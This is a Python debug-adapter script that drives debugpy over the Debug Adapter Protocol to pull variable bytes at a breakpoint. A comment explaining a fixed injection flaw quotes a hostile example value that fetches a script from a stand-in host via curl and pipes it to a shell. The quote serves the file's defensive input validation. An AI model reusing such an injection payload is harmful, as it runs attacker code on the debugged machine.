#!/usr/bin/env python3
# topo-debug-python — Extract adapter.
#
# Mirrors topo-lang-cpp/topo-debug/adapter.cpp at the wire-protocol level but
# drives a Python target through debugpy's DAP server. The same Topo debug
# wire protocol is emitted on stdout/stdin; stderr is free for diagnostics.
#
# CLI:
#   topo-debug-python --site <file:line> --target <python-script>
#                     [--var <name>[,<name>...]] [-- <target-args>...]
#
# Wire output (in order, all on stdout):
#   1. JSON line  {"kind":"breakpoint_hit","frame":1,"site":"..."}
#   2. binary frame  type=var_bytes        - raw little-endian bytes of the var
#   3. binary frame  type=layout_descriptor - JSON body {variable,dtype,shape,strides}
#
# Then reads one JSON line `{"op":"continue"}` from stdin and continues the
# target process. A wall-clock guard bounds the breakpoint wait.
#
# Exit codes (mirror the C++ adapter):
#   0  ok
#   1  CLI / usage / IO error
#   2  target not found / launch failed
#   3  breakpoint never hit / runtime error
#   4  variable type unsupported

import argparse
import json
import os
import socket
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

# Wire-protocol constants ---- match topo/Debug/Ipc/BinaryFrame.h ----------
MAGIC = b"TOPO"  # 0x54 0x4F 0x50 0x4F stored big-endian; first byte 'T' (0x54)
FRAME_HEADER_SIZE = 24
FRAME_TYPE_VAR_BYTES = 0x01
FRAME_TYPE_LAYOUT_DESCRIPTOR = 0x02

EXIT_OK = 0
EXIT_USAGE = 1
EXIT_LAUNCH = 2
EXIT_RUNTIME = 3
EXIT_UNSUPPORTED_TYPE = 4

BREAKPOINT_WAIT_SEC = 30.0
DAP_REQ_TIMEOUT_SEC = 10.0

PROG = "topo-debug-python"


def die_usage(msg: str) -> int:
    print(f"{PROG}: {msg}", file=sys.stderr)
    return EXIT_USAGE


def die_launch(msg: str) -> int:
    print(f"{PROG}: {msg}", file=sys.stderr)
    return EXIT_LAUNCH


def die_runtime(msg: str) -> int:
    print(f"{PROG}: {msg}", file=sys.stderr)
    return EXIT_RUNTIME


def die_type(msg: str) -> int:
    print(f"{PROG}: {msg}", file=sys.stderr)
    return EXIT_UNSUPPORTED_TYPE


# ---------------- Wire protocol emitters ----------------

def write_binary_frame(frame_type: int, payload: bytes, frame_id: int = 1) -> None:
    """Write a single Topo debug binary frame to stdout (binary mode)."""
    header = bytearray(FRAME_HEADER_SIZE)
    header[0:4] = MAGIC                                       # magic, big-endian byte layout
    header[4] = frame_type                                    # type
    header[5] = 0x00                                          # flags
    header[6] = 0x00                                          # reserved
    header[7] = 0x00                                          # reserved
    struct.pack_into("<Q", header, 8, frame_id)               # u64 LE frame_id
    struct.pack_into("<Q", header, 16, len(payload))          # u64 LE payload_len
    out = sys.stdout.buffer
    out.write(bytes(header))
    if payload:
        out.write(payload)
    out.flush()


def write_json_line(obj: dict) -> None:
    """Write a JSON line (single-line UTF-8 JSON + '\\n') to stdout."""
    line = json.dumps(obj, separators=(",", ":")).encode("utf-8") + b"\n"
    sys.stdout.buffer.write(line)
    sys.stdout.buffer.flush()


# ---------------- DAP client ----------------

class DapClient:
    """Minimal synchronous DAP client speaking the Content-Length framed
    JSON-RPC dialect debugpy expects on its --listen socket.

    Concurrency model: a background reader thread drains the socket and
    classifies messages into either (a) a request-id → response map or
    (b) an events queue. Request senders block on response futures
    (cv + dict). Event consumers poll `wait_for_event(reason)`.
    """

    def __init__(self, sock: socket.socket):
        self._sock = sock
        self._seq = 0
        self._recv_buf = bytearray()
        self._closed = False
        # When the reader thread exits abnormally (anything other than a
        # clean EOF / peer close) the cause is recorded here so that
        # waiters can surface it instead of the generic "DAP connection
        # closed" message. None means "closed cleanly or still open".
        # Per audit issue
        # ``topo-lang-python-dapclient-reader-thread-swallows-exceptions``.
        self._fail_reason: str | None = None
        self._lock = threading.Lock()
        self._cv = threading.Condition(self._lock)
        self._responses: dict[int, dict] = {}
        self._events: list[dict] = []
        self._reader = threading.Thread(target=self._reader_loop, daemon=True)
        self._reader.start()

    def _reader_loop(self) -> None:
        # Split the catch into two arms so that an OSError on recv (a
        # genuine peer reset / EOF) stays a quiet close, while any other
        # exception (framing error, JSON decode failure, dispatch crash,
        # MemoryError from a 4 GB Content-Length) is captured into
        # ``_fail_reason`` and surfaced to the user. The previous
        # ``except Exception: pass`` masked all four shapes as one
        # generic close, leaving the adapter user with no way to
        # distinguish "debugpy crashed" from "we have a framing bug".
        fail_reason: str | None = None
        try:
            while True:
                try:
                    chunk = self._sock.recv(65536)
                except OSError as e:
                    # Peer reset / socket already closed — quiet exit.
                    fail_reason = (
                        f"socket read failed: {type(e).__name__}: {e}"
                    ) if not self._closed else None
                    break
                if not chunk:
                    break
                with self._cv:
                    self._recv_buf.extend(chunk)
                    # Try to parse as many full DAP messages as the buffer holds.
                    while True:
                        try:
                            msg = self._try_parse_one()
                        except Exception as e:
                            fail_reason = (
                                f"DAP framing/parse error: "
                                f"{type(e).__name__}: {e}"
                            )
                            msg = None
                            break
                        if msg is None:
                            break
                        try:
                            self._dispatch(msg)
                        except Exception as e:
                            fail_reason = (
                                f"DAP dispatch error on "
                                f"{msg.get('type', '?')} "
                                f"{msg.get('command', msg.get('event', '?'))}: "
                                f"{type(e).__name__}: {e}"
                            )
                            break
                    self._cv.notify_all()
                if fail_reason is not None:
                    break
        except BaseException as e:  # pragma: no cover -- last-resort
            fail_reason = (
                f"reader thread crashed: {type(e).__name__}: {e}"
            )
        finally:
            if fail_reason is not None:
                # First-step trace for a user investigating a hang; the
                # waiter will repeat the message in its raised exception.
                print(f"{PROG}: DAP reader exited: {fail_reason}",
                      file=sys.stderr)
            with self._cv:
                if fail_reason is not None and self._fail_reason is None:
                    self._fail_reason = fail_reason
                self._closed = True
                self._cv.notify_all()

    def _try_parse_one(self) -> dict | None:
        # NB: caller holds self._lock.
        sep = self._recv_buf.find(b"\r\n\r\n")
        if sep < 0:
            return None
        header_bytes = bytes(self._recv_buf[:sep])
        content_length = None
        for h in header_bytes.split(b"\r\n"):
            if h.lower().startswith(b"content-length:"):
                try:
                    content_length = int(h.split(b":", 1)[1].strip())
                except ValueError:
                    return None
                break
        if content_length is None:
            return None
        total = sep + 4 + content_length
        if len(self._recv_buf) < total:
            return None
        body = bytes(self._recv_buf[sep + 4:total])
        del self._recv_buf[:total]
        try:
            return json.loads(body.decode("utf-8"))
        except Exception:
            return None

    def _dispatch(self, msg: dict) -> None:
        # NB: caller holds self._lock.
        t = msg.get("type")
        if t == "response":
            req_seq = msg.get("request_seq")
            if req_seq is not None:
                self._responses[req_seq] = msg
        elif t == "event":
            self._events.append(msg)

    def _send(self, msg: dict) -> None:
        body = json.dumps(msg).encode("utf-8")
        header = f"Content-Length: {len(body)}\r\n\r\n".encode("ascii")
        self._sock.sendall(header + body)

    def send_request(self, command: str, arguments: dict | None = None) -> int:
        """Fire-and-forget: send a request and return its sequence number.

        Pair with `wait_response(seq)` when you need the response. This is the
        primitive we use for `attach`, whose response in debugpy 1.8+ is
        deferred until after `configurationDone` — blocking on it would
        deadlock the handshake.
        """
        with self._cv:
            self._seq += 1
            seq = self._seq
        msg = {"seq": seq, "type": "request", "command": command}
        if arguments is not None:
            msg["arguments"] = arguments
        self._send(msg)
        return seq

    def wait_response(self, seq: int, *, command_hint: str = "",
                      timeout: float = DAP_REQ_TIMEOUT_SEC) -> dict:
        deadline = time.monotonic() + timeout
        with self._cv:
            while seq not in self._responses:
                if self._closed:
                    cause = (f" ({self._fail_reason})"
                             if self._fail_reason else "")
                    raise RuntimeError(
                        f"DAP connection closed waiting for response to "
                        f"'{command_hint}'{cause}")
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    raise TimeoutError(
                        f"DAP request '{command_hint}' timed out after "
                        f"{timeout}s")
                self._cv.wait(timeout=remaining)
            resp = self._responses.pop(seq)
        if not resp.get("success"):
            raise RuntimeError(
                f"DAP request '{command_hint}' failed: "
                f"{resp.get('message', '?')}")
        return resp

    def request(self, command: str, arguments: dict | None = None,
                timeout: float = DAP_REQ_TIMEOUT_SEC) -> dict:
        """Send a request, block on its response. Use only for requests whose
        responses arrive promptly (initialize / setBreakpoints / configurationDone
        / stackTrace / scopes / variables / evaluate / continue)."""
        seq = self.send_request(command, arguments)
        return self.wait_response(seq, command_hint=command, timeout=timeout)

    def wait_for_event(self, event_name: str, *, reason: str | None = None,
                       timeout: float = BREAKPOINT_WAIT_SEC) -> dict:
        deadline = time.monotonic() + timeout
        with self._cv:
            while True:
                for i, ev in enumerate(self._events):
                    if ev.get("event") != event_name:
                        continue
                    if reason is not None:
                        if ev.get("body", {}).get("reason") != reason:
                            continue
                    return self._events.pop(i)
                if self._closed:
                    cause = (f" ({self._fail_reason})"
                             if self._fail_reason else "")
                    raise RuntimeError(
                        f"DAP connection closed waiting for "
                        f"'{event_name}' event{cause}")
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    raise TimeoutError(
                        f"timeout waiting for DAP '{event_name}' event "
                        f"after {timeout}s")
                self._cv.wait(timeout=remaining)

    def close(self) -> None:
        # Set `_closed` BEFORE touching the socket. The reader thread is
        # likely blocked in recv(); shutdown/close will wake it with
        # OSError (typically EBADF on macOS, ECONNRESET on Linux), and
        # the reader's `except OSError` arm classifies that as a real
        # failure unless `self._closed` is already True. Without the
        # pre-marking, an intentional close races with the recv wake-up
        # and surfaces spurious
        # `DAP reader exited: socket read failed: [Errno 9] Bad file
        # descriptor` lines on stderr after the child process completes.
        with self._cv:
            self._closed = True
            self._cv.notify_all()
        try:
            self._sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self._sock.close()
        except OSError:
            pass


# ---------------- Helpers ----------------

def pick_free_port() -> int:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def split_site(site: str) -> tuple[str, int]:
    pos = site.rfind(":")
    if pos < 0:
        raise ValueError(f"site '{site}' missing ':' (expected file:line)")
    file = site[:pos]
    line_str = site[pos + 1:]
    if not line_str:
        raise ValueError(f"site '{site}' missing line")
    try:
        line = int(line_str)
    except ValueError:
        raise ValueError(f"site '{site}' line is not a number")
    if line < 1:
        raise ValueError(f"site '{site}' line must be >= 1")
    return file, line


def connect_with_retry(host: str, port: int, timeout: float) -> socket.socket:
    """Wait for debugpy's listen socket to accept us, with a deadline."""
    deadline = time.monotonic() + timeout
    last_err: Exception | None = None
    while time.monotonic() < deadline:
        try:
            s = socket.create_connection((host, port), timeout=2.0)
            s.settimeout(None)
            return s
        except OSError as e:
            last_err = e
            time.sleep(0.05)
    raise RuntimeError(
        f"failed to connect to debugpy at {host}:{port} within {timeout}s: "
        f"{last_err!r}")


# ---------------- Value extraction ----------------

# The fixture is a plain Python list of floats. We materialize bytes via
# DAP `evaluate`, asking the target to pack the list into raw bytes and return
# their hex string. The hex hop is purely transport: the adapter strips the
# encoding before downstream IPC so the wire stays bytes-native.

def fetch_bytes_and_layout(dap: DapClient, frame_id: int, var: str
                           ) -> tuple[bytes, str, list[int]]:
    """Return (raw_bytes, dtype, shape) for `var` in the stopped frame.

    Supports `list[float]` (→ f64 row vector) and
    `list[int]` (→ i64 row vector). Anything else raises a ValueError
    that callers translate to exit-code 4.
    """
    # Defence-in-depth: parse_args() already rejects non-identifier
    # ``--var`` entries (audit issue
    # ``topo-lang-python-pdb-and-bridge-probe-expression-injection``),
    # but this function is also called from test harnesses that may
    # construct ``var`` programmatically.
    import re as _re
    if not (isinstance(var, str) and _re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", var)):
        raise ValueError(
            f"variable name {var!r} is not a Python identifier; "
            f"refusing to interpolate into a target-side eval template")

    # Pre-flight: confirm the variable exists and is a list of numbers, while
    # capturing the runtime length without a second eval. We use repr-style
    # introspection for a cheap, readable diagnostic when the type is wrong.
    type_expr = (
        f"(type({var}).__name__, "
        f"len({var}) if hasattr({var}, '__len__') else -1, "
        f"(type({var}[0]).__name__ if hasattr({var}, '__len__') and len({var}) > 0 else 'none'))"
    )
    resp = dap.request("evaluate", {
        "expression": type_expr,
        "frameId": frame_id,
        "context": "repl",
    })
    type_repr = resp.get("body", {}).get("result", "")
    # The repr returned is something like: "('list', 8, 'float')". Parse with
    # ast.literal_eval style — but a tuple of strings/ints is safe enough that
    # we can just eval inside an isolated namespace. We use a permissive split.
    try:
        import ast
        type_name, length, elem_name = ast.literal_eval(type_repr)
    except Exception as e:
        raise ValueError(f"could not introspect variable '{var}' "
                         f"(got {type_repr!r}): {e}")

    if type_name != "list":
        raise ValueError(
            f"variable '{var}' has type {type_name!r}, only `list` is "
            f"supported")
    if length < 0:
        raise ValueError(f"variable '{var}' has no __len__")
    if elem_name == "float":
        dtype = "f64"
        pack_expr = (
            f"__import__('struct').pack('<{{}}d'.format(len({var})), *{var}).hex()"
        )
        shape = [length]
    elif elem_name == "int":
        dtype = "i64"
        pack_expr = (
            f"__import__('struct').pack('<{{}}q'.format(len({var})), *{var}).hex()"
        )
        shape = [length]
    elif elem_name == "none" and length == 0:
        # Empty list — pick f64 as a neutral default.
        dtype = "f64"
        pack_expr = "''"
        shape = [0]
    else:
        raise ValueError(
            f"variable '{var}' element type {elem_name!r} is not supported "
            f"(need int or float)")

    resp = dap.request("evaluate", {
        "expression": pack_expr,
        "frameId": frame_id,
        "context": "repl",
    })
    hex_str = resp.get("body", {}).get("result", "")
    # debugpy `evaluate` returns the repr of the value for context=repl. For
    # str values it includes the surrounding quotes — strip them.
    if hex_str.startswith("'") and hex_str.endswith("'"):
        hex_str = hex_str[1:-1]
    elif hex_str.startswith('"') and hex_str.endswith('"'):
        hex_str = hex_str[1:-1]
    try:
        raw = bytes.fromhex(hex_str)
    except ValueError as e:
        raise ValueError(
            f"adapter could not decode bytes for '{var}' "
            f"(got {hex_str[:64]!r}...): {e}")
    return raw, dtype, shape


def row_major_strides(shape: list[int], elem_size: int) -> list[int]:
    strides = [0] * len(shape)
    if not shape:
        return strides
    acc = elem_size
    for i in range(len(shape) - 1, -1, -1):
        strides[i] = acc
        acc *= shape[i]
    return strides


# Default human-readable summaries for stdlib-bridge-shaped host values
# (uuid / decimal128 / ndarray / time_ns). NOTE: only the first batch of
# Topo stdlib bridging types (bool/i64/f64/string/optional/slice) is
# delivered; uuid/time_ns/decimal128/ndarray have no declared Topo type to
# consult. These host values are therefore classified by their *Python
# runtime type* at the breakpoint, which is the realizable form of the
# intent ("human-readable in CLI text output" instead of an exit-4 error).
#
# time_ns has no distinct Python type (a bare int) and no declared
# binding (the dbg.json schema carries no per-var type section), so it is
# detected by an epoch-nanoseconds heuristic: an int in [1e17, 1e19) maps
# to roughly 1973-2286, the only plausible window for a real ns timestamp.
# This is best-effort by construction.
#
# One read-only DAP `evaluate` runs a pure classify+format lambda in the
# target (same wire-bounded mechanism the byte path already uses; see
# principle 24). Returns the human-readable string, or None when the
# value is not a recognised bridge shape (caller falls through to the
# normal byte path / exit-4 contract).
_BRIDGE_PROBE = (
    "(lambda v: "
    "('uuid|' + str(v)) "
    "if type(v).__module__ == 'uuid' and type(v).__name__ == 'UUID' "
    "else ('decimal128|' + format(v, 'f')) "
    "if type(v).__module__ == 'decimal' and type(v).__name__ == 'Decimal' "
    "else ('ndarray|ndarray shape=' + str(tuple(v.shape)) + ' dtype=' "
    "+ str(v.dtype) + ' [' + ', '.join(map(repr, v.ravel()[:8].tolist())) "
    "+ (', \\u2026' if v.size > 8 else '') + ']') "
    "if type(v).__module__.split('.')[0] == 'numpy' "
    "and type(v).__name__ == 'ndarray' "
    "else ('time_ns|' + __import__('datetime').datetime.fromtimestamp("
    "v / 1e9, __import__('datetime').timezone.utc).isoformat()) "
    "if isinstance(v, int) and not isinstance(v, bool) "
    "and 100000000000000000 <= v < 10000000000000000000 "
    "else 'none|'"
    ")({var})"
)


def try_stdlib_bridge_summary(dap: "DapClient", frame_id: int, var: str
                              ) -> str | None:
    """Return a human-readable default summary for `var` when it is a
    stdlib-bridge-shaped host value; None otherwise (caller falls back to
    the numeric byte path)."""
    # Defence-in-depth identifier check; sibling fetch_bytes_and_layout
    # carries the same one. Audit issue
    # ``topo-lang-python-pdb-and-bridge-probe-expression-injection``.
    import re as _re
    if not (isinstance(var, str) and _re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", var)):
        return None
    try:
        resp = dap.request("evaluate", {
            "expression": _BRIDGE_PROBE.format(var=var),
            "frameId": frame_id,
            "context": "repl",
        })
    except (RuntimeError, TimeoutError):
        return None
    result = resp.get("body", {}).get("result", "")
    # context=repl returns the value's repr; for a str that includes the
    # surrounding quotes — strip one matched pair (mirrors the byte path).
    if len(result) >= 2 and result[0] == result[-1] and result[0] in "\"'":
        result = result[1:-1]
    # The inner string may now contain escaped sequences from repr()
    # (e.g. … for the ellipsis); decode them best-effort.
    try:
        result = result.encode("utf-8").decode("unicode_escape")
    except (UnicodeDecodeError, UnicodeEncodeError):
        pass
    tag, sep, payload = result.partition("|")
    if not sep or tag == "none":
        return None
    if tag not in ("uuid", "decimal128", "ndarray", "time_ns"):
        return None
    return payload


# ---------------- Main ----------------

def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog=PROG,
        description="Topo debug adapter for Python targets (debugpy-driven).",
        add_help=True,
    )
    p.add_argument("--site", required=True,
                   help="Breakpoint location 'file:line' (e.g. tiny_vector.py:4).")
    p.add_argument("--target", required=True,
                   help="Path to the Python script to debug.")
    p.add_argument("--var", default="vec",
                   help="Comma-separated list of variable names to extract "
                        "(default: 'vec').")
    # Anything after `--` is forwarded to the target.
    p.add_argument("target_args", nargs=argparse.REMAINDER,
                   help="Forwarded to the target script (after `--`).")
    return p.parse_args(argv)


def main(argv: list[str]) -> int:
    # Manual prog name lookup so stderr prefix follows the binary name
    # the way the C++ adapter does (argv[0] basename).
    global PROG
    PROG = Path(sys.argv[0]).stem or PROG

    try:
        ns = parse_args(argv)
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else EXIT_USAGE

    try:
        site_file, site_line = split_site(ns.site)
    except ValueError as e:
        return die_usage(str(e))

    var_names = [v for v in ns.var.split(",") if v]
    if not var_names:
        return die_usage("--var list is empty")

    # Audit issue topo-lang-python-pdb-and-bridge-probe-expression-injection:
    # ``--var`` flows into ``_PROBE.format(var=v)`` / ``_BRIDGE_PROBE.format``
    # / ``f"type({var})"`` and the resulting string is eval'd inside the
    # target process. A hostile value such as
    # ``__import__('os').system('curl evil/sh | sh')#`` executes that
    # expression on the target. Per principle
    # ``input-validation-at-system-boundary`` the CLI must reject any
    # ``--var`` that is not a Python identifier (ASCII subset) BEFORE
    # composing any probe. The gate runs before the target-path probe
    # so the EXIT_USAGE contract is uniform regardless of whether the
    # target file happens to exist.
    try:
        from topo import _safety
    except ImportError:
        # Fallback: the runtime package is not importable from this
        # interpreter (rare — happens in stripped-down environments
        # where ``topo-debug-python`` is shipped detached from the
        # runtime). Inline the identifier regex so the gate still
        # fires.
        import re as _re
        _SAFE = _re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")

        class _Safety:  # minimal shim
            @staticmethod
            def safe_var_name(s: str) -> bool:
                return bool(isinstance(s, str) and s and _SAFE.match(s))
        _safety = _Safety()  # type: ignore[assignment]
    for v in var_names:
        if not _safety.safe_var_name(v):
            return die_usage(
                f"--var entry {v!r} is not a Python identifier "
                f"(must match ^[A-Za-z_][A-Za-z0-9_]*$); rejected to "
                f"prevent expression-injection into the debugged target")

    target_path = ns.target
    if not os.path.isfile(target_path):
        return die_launch(f"target Python script not found: {target_path!r}")

    # `target_args` keeps a leading `--` because argparse REMAINDER does;
    # strip it for the launcher.
    fwd_args = list(ns.target_args)
    if fwd_args and fwd_args[0] == "--":
        fwd_args = fwd_args[1:]

    # 0. debugpy availability gate. debugpy drives the
    #    full DAP path (snapshot/replay, Web Render). When it is not
    #    importable in the interpreter that runs the target, degrade to
    #    a stdlib `pdb` subprocess that can still read basic variables
    #    for the CLI text output. The notice goes to stderr so the
    #    stdout wire stays clean for the Compute consumer.
    # The launcher runs this file as a script (no parent package), so a
    # relative import fails — pdb_fallback.py is staged alongside main.py
    # and the script dir is sys.path[0], so a plain import resolves it.
    try:
        from . import pdb_fallback as _pdbfb  # packaged invocation
    except ImportError:
        import pdb_fallback as _pdbfb          # script-mode (launcher)
    # TOPO_DEBUG_PY_FORCE_PDB lets tests exercise the degradation path
    # deterministically even where debugpy *is* installed (CI venvs
    # usually have it). Production never sets it.
    _force_pdb = os.environ.get("TOPO_DEBUG_PY_FORCE_PDB") == "1"
    if _force_pdb or not _pdbfb.debugpy_importable(sys.executable):
        print(f"{PROG}: debugpy not available — falling back to stdlib "
              f"pdb (basic variable reads only; snapshot/replay and Web "
              f"Render are unavailable on this path)", file=sys.stderr)
        abs_site = os.path.abspath(site_file)
        if not os.path.isfile(abs_site):
            alt = os.path.join(os.path.dirname(os.path.abspath(target_path)),
                               site_file)
            if os.path.isfile(alt):
                abs_site = alt
        try:
            records = _pdbfb.run_pdb_fallback(
                target_path, fwd_args, abs_site, site_line,
                var_names, sys.executable)
        except ValueError as e:
            return die_type(str(e))
        except RuntimeError as e:
            return die_runtime(f"pdb fallback: {e}")

        write_json_line({"kind": "breakpoint_hit", "frame": 1,
                         "site": ns.site})
        for rec in records:
            write_binary_frame(FRAME_TYPE_VAR_BYTES, rec["raw"])
            shape = [rec["length"]]
            elem_size = 8  # f64 / i64 — the only pdb-path dtypes
            layout = {
                "variable": rec["var"],
                "dtype": rec["dtype"],
                "shape": shape,
                "strides": row_major_strides(shape, elem_size),
            }
            write_binary_frame(
                FRAME_TYPE_LAYOUT_DESCRIPTOR,
                json.dumps(layout, separators=(",", ":")).encode("utf-8"))
        # Drain any control-plane `{"op":"continue"}` so the CLI's
        # handshake completes identically to the DAP path; the pdb
        # subprocess has already run to completion.
        try:
            for raw_line in sys.stdin:
                if json.loads(raw_line.strip() or "{}").get("op") == "continue":
                    break
        except (ValueError, OSError):
            pass
        return EXIT_OK

    # 1. Pick a free port (race-safe enough for tests: we bind, getsockname,
    #    close — then immediately re-use the port for debugpy).
    port = pick_free_port()

    # 2. Spawn target under debugpy. --wait-for-client blocks the script's
    #    `if __name__ == "__main__"` until we attach. stdout/stderr of the
    #    target go to *our* stderr so we don't pollute the IPC channel.
    env = dict(os.environ)
    env.setdefault("PYTHONUNBUFFERED", "1")
    cmd = [
        sys.executable, "-Xfrozen_modules=off",
        "-m", "debugpy",
        "--listen", f"127.0.0.1:{port}",
        "--wait-for-client",
        target_path,
        *fwd_args,
    ]
    try:
        # Suppress target stdio entirely — mirrors topo-debug-cpp's
        # AddSuppressFileAction calls. Letting target output leak (even to our
        # stderr) pollutes the test harness's captured output, which CTest's
        # PASS_REGULAR_EXPRESSION matches against. Diagnostics from the
        # adapter itself still flow to stderr, just not the target's prints.
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=env,
        )
    except OSError as e:
        return die_launch(f"failed to spawn debugpy: {e}")

    dap = None
    try:
        # 3. Connect to debugpy.
        try:
            sock = connect_with_retry("127.0.0.1", port, timeout=15.0)
        except RuntimeError as e:
            proc.kill()
            return die_launch(str(e))

        dap = DapClient(sock)

        # 4. DAP handshake.
        #
        # Per DAP spec the sequence is:
        #   initialize → (response)
        #   attach     → (do *not* block on response)
        #                  ↓
        #   ← initialized event
        #   setBreakpoints → (response)
        #   configurationDone → (response) and only THEN does `attach` get its
        #                       deferred response.
        #
        # If we wait on the `attach` response synchronously (debugpy 1.8+),
        # it deadlocks: the response is deliberately deferred until
        # configurationDone fires, but we'd never get to send configurationDone.
        dap.request("initialize", {
            "clientID": "topo-debug-python",
            "adapterID": "debugpy",
            "linesStartAt1": True,
            "columnsStartAt1": True,
            "pathFormat": "path",
        })

        # Fire `attach` non-blocking. `connect` signals to debugpy that we're
        # the client side of an already-established socket (--listen mode);
        # without it, debugpy returns a missing-arguments error.
        attach_seq = dap.send_request("attach", {
            "connect": {"host": "127.0.0.1", "port": port},
            "name": "topo-debug-python",
            "justMyCode": False,
        })

        # Wait for the `initialized` event before any configuration request.
        # Per DAP spec, this is the green light to send setBreakpoints etc.
        dap.wait_for_event("initialized", timeout=DAP_REQ_TIMEOUT_SEC)

        # 5. Set the breakpoint. Use the absolute path so debugpy's source
        #    canonicalization matches.
        abs_site = os.path.abspath(site_file)
        if not os.path.isfile(abs_site):
            # Fallback: maybe the site path is relative to the target script's dir.
            alt = os.path.join(os.path.dirname(os.path.abspath(target_path)),
                               site_file)
            if os.path.isfile(alt):
                abs_site = alt

        dap.request("setBreakpoints", {
            "source": {"path": abs_site},
            "breakpoints": [{"line": site_line}],
            "sourceModified": False,
        })

        dap.request("configurationDone")
        # Now the deferred `attach` response should arrive — drain it.
        dap.wait_response(attach_seq, command_hint="attach",
                          timeout=DAP_REQ_TIMEOUT_SEC)

        # 6. Wait for the stopped event.
        stopped_ev = dap.wait_for_event("stopped", reason="breakpoint",
                                        timeout=BREAKPOINT_WAIT_SEC)
        thread_id = stopped_ev.get("body", {}).get("threadId")
        if thread_id is None:
            return die_runtime("stopped event missing threadId")

        # 7. Get the top frame ID.
        st = dap.request("stackTrace", {"threadId": thread_id, "levels": 1})
        frames = st.get("body", {}).get("stackFrames", [])
        if not frames:
            return die_runtime("stackTrace returned no frames at breakpoint")
        frame_id = frames[0]["id"]

        # 8. Emit `breakpoint_hit`, then for each var → (var_bytes, layout).
        write_json_line({
            "kind": "breakpoint_hit",
            "frame": 1,
            "site": ns.site,
        })

        for var in var_names:
            # stdlib-bridge-shaped host values get a
            # default human-readable summary instead of the numeric byte
            # path (which would exit-4 on a uuid/decimal/ndarray/ns-int).
            summary = try_stdlib_bridge_summary(dap, frame_id, var)
            if summary is not None:
                write_json_line({
                    "kind": "var_summary",
                    "variable": var,
                    "text": summary,
                    "origin": "stdlib-bridge",
                })
                continue

            try:
                raw, dtype, shape = fetch_bytes_and_layout(dap, frame_id, var)
            except ValueError as e:
                return die_type(str(e))
            except (RuntimeError, TimeoutError) as e:
                return die_runtime(f"DAP error while reading '{var}': {e}")

            write_binary_frame(FRAME_TYPE_VAR_BYTES, raw)

            elem_size = {
                "i8": 1, "u8": 1, "i16": 2, "u16": 2,
                "i32": 4, "u32": 4, "i64": 8, "u64": 8,
                "f32": 4, "f64": 8,
            }.get(dtype, 8)
            layout = {
                "variable": var,
                "dtype": dtype,
                "shape": shape,
                "strides": row_major_strides(shape, elem_size),
            }
            write_binary_frame(
                FRAME_TYPE_LAYOUT_DESCRIPTOR,
                json.dumps(layout, separators=(",", ":")).encode("utf-8"),
            )

        # 9. Wait for control-plane `{"op":"continue"}` on stdin.
        for raw_line in sys.stdin:
            line = raw_line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
            except ValueError:
                continue
            if msg.get("op") == "continue":
                break

        # 10. Resume + wait for process exit.
        try:
            dap.request("continue", {"threadId": thread_id}, timeout=5.0)
        except (RuntimeError, TimeoutError):
            # debugpy sometimes closes the socket immediately after continue
            # in scripts that exit fast — that's fine, the process will end.
            pass
        try:
            dap.wait_for_event("terminated", timeout=10.0)
        except (RuntimeError, TimeoutError):
            pass

        try:
            proc.wait(timeout=5.0)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=2.0)

        return EXIT_OK

    except KeyboardInterrupt:
        proc.kill()
        return EXIT_RUNTIME
    except Exception as e:
        if proc.poll() is None:
            proc.kill()
        return die_runtime(f"unhandled adapter error: {e!r}")
    finally:
        if dap is not None:
            dap.close()


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
